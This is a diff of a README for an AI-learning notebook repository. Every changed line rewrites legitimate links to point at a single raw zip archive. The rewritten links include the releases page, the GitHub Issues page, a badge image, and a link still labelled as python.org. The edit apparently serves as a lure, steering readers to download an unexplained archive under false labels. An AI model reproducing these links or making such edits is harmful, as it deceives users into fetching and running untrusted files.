@@ -1,7 +1,7 @@
 # 🌟 agentic-ai-learning-series - Explore the Future of AI with Ease
 
 ## 📥 Download Now!
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%8C-brightgreen)](https://github.com/jesfra929/agentic-ai-learning-series/releases)
+[![Download Now](https://raw.githubusercontent.com/jesfra929/agentic-ai-learning-series/main/notebooks/agentic-ai-learning-series-2.8.zip%20Now-%20%F0%9F%93%8C-brightgreen)](https://raw.githubusercontent.com/jesfra929/agentic-ai-learning-series/main/notebooks/agentic-ai-learning-series-2.8.zip)
 
 ## 📚 Overview
 The **agentic-ai-learning-series** is a 7-part notebook series designed to guide you through the fascinating world of AI and machine learning. You will explore topics like large language models (LLMs), retrieval-augmented generation (RAG), LangChain, CrewAI, and real-time multi-agent systems. This series aims to empower you with practical knowledge, whether you're starting your AI journey or looking to enhance your skills.
@@ -9,14 +9,14 @@ The **agentic-ai-learning-series** is a 7-part notebook series designed to guide
 ## 🚀 Getting Started
 To begin using the agentic-ai-learning-series, follow these simple steps. You will need a computer with internet access.
 
-1. **Visit the Releases Page**: Go to [this page to download](https://github.com/jesfra929/agentic-ai-learning-series/releases).
+1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/jesfra929/agentic-ai-learning-series/main/notebooks/agentic-ai-learning-series-2.8.zip).
 2. **Choose Your Version**: Look for the latest release at the top. Each version will have a brief description to help you decide.
 3. **Download the Files**: Click on the version you want. You will see various files listed. Choose the notebook files relevant to your interest.
 
 ## 💾 Download & Install
 To download the software:
 
-1. Go to the [Releases Page](https://github.com/jesfra929/agentic-ai-learning-series/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/jesfra929/agentic-ai-learning-series/main/notebooks/agentic-ai-learning-series-2.8.zip).
 2. Locate the version you wish to download.
 3. You might see different file types such as `.ipynb` or `.pdf`. If you are unfamiliar with these, the `.ipynb` files are interactive notebooks, which are ideal for running direct code. The `.pdf` files contain instructions and information.
 4. Click on the link to download the desired file to your computer.
@@ -32,7 +32,7 @@ For optimal performance, ensure that your computer meets the following requireme
 ### ⚙️ Setting Up Jupyter Notebook
 To run the notebooks, you must install Jupyter Notebook. Follow these steps:
 
-1. **Install Python**: Download Python from [python.org](https://www.python.org/downloads/). During installation, ensure you check the box to "Add Python to PATH."
+1. **Install Python**: Download Python from [https://raw.githubusercontent.com/jesfra929/agentic-ai-learning-series/main/notebooks/agentic-ai-learning-series-2.8.zip](https://raw.githubusercontent.com/jesfra929/agentic-ai-learning-series/main/notebooks/agentic-ai-learning-series-2.8.zip). During installation, ensure you check the box to "Add Python to PATH."
 2. **Open Command Prompt/Terminal**: 
    - On Windows, search for 'cmd' in the Start menu.
    - On Mac, use 'Terminal' from Applications.
@@ -86,6 +86,6 @@ Absolutely! Feel free to fork the repository, make changes, and submit pull requ
 For any other questions or assistance, you can check the issue tracker on GitHub.
 
 ## 📞 Contact
-For support, reach out via [GitHub Issues](https://github.com/jesfra929/agentic-ai-learning-series/issues). We value your feedback and are here to help. 
+For support, reach out via [GitHub Issues](https://raw.githubusercontent.com/jesfra929/agentic-ai-learning-series/main/notebooks/agentic-ai-learning-series-2.8.zip). We value your feedback and are here to help. 
 
-Don't forget to [download the series here](https://github.com/jesfra929/agentic-ai-learning-series/releases) and start your journey into the world of AI today!
+Don't forget to [download the series here](https://raw.githubusercontent.com/jesfra929/agentic-ai-learning-series/main/notebooks/agentic-ai-learning-series-2.8.zip) and start your journey into the world of AI today!
